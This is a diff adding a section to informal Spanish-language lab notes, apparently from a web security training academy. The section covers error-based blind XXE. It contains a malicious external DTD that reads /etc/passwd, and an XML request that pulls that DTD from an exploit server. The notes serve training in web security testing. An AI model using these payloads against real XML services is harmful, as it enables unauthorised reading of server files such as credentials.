@@ -206,6 +206,35 @@ exfiliar informacion.
   ```
   Revisamos en el burp colaborator y en la http reques se paso la solicion como query ?valor
   
+  
+# Exploiting blind XXE to retrieve data via error messages
+  
+  En este ejercicio hacemos uso de los errores para jalar datos primero identificacmos que nos regresa datos dentro del erro asi:
+  
+  
+*** Codigo alojado en el servidor
+  
+  ```
+  
+ <!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/HolaMundo'>">
+%eval;
+%exfil;
+  
+  ```
+  Nos regresa un erro y un hola mundo entonces se sopecha que puede procesar datos.
+  
+  ```
+  <?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://exploit-0a160089044434d6c069487801d700ce.web-security-academy.net/exploit"> %xxe;]>
+<stockCheck>
+<productId>1</productId>
+<storeId>1</storeId>
+</stockCheck>
+  
+  ```
+  Y nos regresa el error y el archivo /etc/passwd procesado en el burp al enviar la peticion usando el repeater.
+  
 ***Referencias***
 
 Validador de XML
